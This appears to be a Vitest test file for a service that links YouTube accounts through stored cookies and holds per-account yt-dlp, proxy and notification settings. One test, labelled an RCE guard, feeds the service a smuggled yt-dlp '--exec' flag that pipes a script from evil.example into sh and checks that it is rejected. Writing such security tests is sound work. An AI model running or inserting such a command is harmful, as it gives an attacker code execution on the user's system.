import { describe, it, expect, vi, beforeEach } from 'vitest';

const store: Record<string, any> = {};
vi.mock('../db', () => ({
	prisma: {
		youTubeLink: {
			upsert: vi.fn(async ({ where, create, update }) => {
				store[where.userId] = { ...(store[where.userId] || create), ...update, ...create };
				return store[where.userId];
			}),
			findUnique: vi.fn(async ({ where }) => store[where.userId] ?? null),
			delete: vi.fn(async ({ where }) => {
				delete store[where.userId];
			}),
			update: vi.fn(async ({ where, data }) => {
				store[where.userId] = { ...store[where.userId], ...data };
				return store[where.userId];
			}),
			updateMany: vi.fn(async ({ where, data }) => {
				if (store[where.userId]) {
					Object.assign(store[where.userId], data);
					return { count: 1 };
				}
				return { count: 0 };
			}),
		},
	},
}));

process.env.AUTH_SECRET = 'test-secret-for-link-service';
import { youtubeLinkService } from './youtube-link.service';

const cookies = [{ domain: '.youtube.com', name: 'SAPISID', value: 'abc', secure: true }];

describe('youtubeLinkService', () => {
	beforeEach(() => {
		for (const k of Object.keys(store)) delete store[k];
	});

	it('stores and returns decrypted cookies.txt', async () => {
		await youtubeLinkService.storeCookies('u1', cookies, { channelName: 'Me' });
		const txt = await youtubeLinkService.getCookiesTxt('u1');
		expect(txt).toContain('SAPISID');
		expect(txt).toContain('# Netscape HTTP Cookie File');
	});

	it('reports link status', async () => {
		await youtubeLinkService.storeCookies('u1', cookies, { channelName: 'Me' });
		const s = await youtubeLinkService.getLinkStatus('u1');
		expect(s.linked).toBe(true);
		expect(s.channelName).toBe('Me');
	});

	it('rejects cookie sets without auth cookies', async () => {
		await expect(
			youtubeLinkService.storeCookies('u1', [{ domain: '.youtube.com', name: 'PREF', value: 'x' }]),
		).rejects.toThrow();
	});

	it('unlink wipes the record', async () => {
		await youtubeLinkService.storeCookies('u1', cookies);
		await youtubeLinkService.unlink('u1');
		expect(await youtubeLinkService.getCookiesTxt('u1')).toBeNull();
	});

	it('updateToggles whitelists only allowed keys and is graceful on missing link', async () => {
		await youtubeLinkService.storeCookies('u1', cookies, { channelName: 'Original' });
		const before = store['u1'];
		const originalEnc = before.cookiesEnc;
		const originalUserId = before.userId;

		await youtubeLinkService.updateToggles('u1', {
			syncWatchLater: true,
			cookiesEnc: 'HACKED',
			userId: 'evil',
		} as any);

		const after = await youtubeLinkService.getLinkStatus('u1');
		expect(after.toggles?.syncWatchLater).toBe(true);
		expect(store['u1'].cookiesEnc).toBe(originalEnc);
		expect(store['u1'].userId).toBe(originalUserId);

		// Missing link is a no-op, does not throw
		await expect(
			youtubeLinkService.updateToggles('unknownUser', { syncHistoryToWytui: false }),
		).resolves.toBeUndefined();
	});
});

describe('account settings overrides', () => {
	beforeEach(() => {
		for (const k of Object.keys(store)) delete store[k];
	});

	it('requires a linked account', async () => {
		await expect(
			youtubeLinkService.updateAccountSettings('nobody', { proxyUrl: 'http://p:1' }),
		).rejects.toThrow('No linked YouTube account');
	});

	it('rejects invalid proxy URLs', async () => {
		await youtubeLinkService.storeCookies('u1', cookies);
		await expect(
			youtubeLinkService.updateAccountSettings('u1', { proxyUrl: 'not a url' }),
		).rejects.toThrow(/proxy URL/i);
	});

	it('rejects extraFlags outside the yt-dlp whitelist (RCE guard)', async () => {
		await youtubeLinkService.storeCookies('u1', cookies);
		await expect(
			youtubeLinkService.updateAccountSettings('u1', {
				extraFlags: ['--exec', 'curl http://evil.example | sh'],
			}),
		).rejects.toThrow(/forbidden flag/i);
	});

	it('persists proxy, flags, and notification settings; empty clears', async () => {
		await youtubeLinkService.storeCookies('u1', cookies);
		await youtubeLinkService.updateAccountSettings('u1', {
			proxyUrl: ' socks5://h:1080 ',
			extraFlags: [' --sleep-requests 1', '', '  '],
			appriseUrl: ' http://apprise:8000 ',
			notifyOnComplete: true,
			notifyOnFail: false,
		});
		const status: any = await youtubeLinkService.getLinkStatus('u1');
		expect(status.ytdlp).toEqual({ proxyUrl: 'socks5://h:1080', extraFlags: ['--sleep-requests 1'] });
		expect(status.notifications).toEqual({
			appriseUrl: 'http://apprise:8000',
			notifyOnComplete: true,
			notifyOnFail: false,
		});

		await youtubeLinkService.updateAccountSettings('u1', { proxyUrl: '', appriseUrl: null });
		const cleared: any = await youtubeLinkService.getLinkStatus('u1');
		expect(cleared.ytdlp.proxyUrl).toBeNull();
		expect(cleared.notifications.appriseUrl).toBeNull();
	});

	it('treats explicit undefined fields as not provided (API route passes every key)', async () => {
		await youtubeLinkService.storeCookies('u1', cookies);
		// /api/youtube/link destructures all account fields and forwards them,
		// so unsubmitted ones arrive as { key: undefined } — not absent keys.
		await youtubeLinkService.updateAccountSettings('u1', {
			proxyUrl: undefined,
			extraFlags: undefined,
			appriseUrl: undefined,
			notifyOnComplete: undefined,
			notifyOnFail: undefined,
			jellyfinUserId: 'ju-1',
		});
		const status: any = await youtubeLinkService.getLinkStatus('u1');
		expect(status.jellyfinUserId).toBe('ju-1');

		await youtubeLinkService.updateAccountSettings('u1', { jellyfinUserId: null });
		const cleared: any = await youtubeLinkService.getLinkStatus('u1');
		expect(cleared.jellyfinUserId).toBeNull();
	});

	it('getAccountYtdlp resolves per-account settings or null', async () => {
		expect(await youtubeLinkService.getAccountYtdlp('u1')).toBeNull();
		expect(await youtubeLinkService.getAccountYtdlp(null)).toBeNull();

		await youtubeLinkService.storeCookies('u1', cookies);
		await youtubeLinkService.updateAccountSettings('u1', {
			proxyUrl: 'http://p:1',
			extraFlags: ['--sleep-requests', '1'],
		});
		expect(await youtubeLinkService.getAccountYtdlp('u1')).toEqual({
			proxyUrl: 'http://p:1',
			extraFlags: ['--sleep-requests', '1'],
		});
	});
});
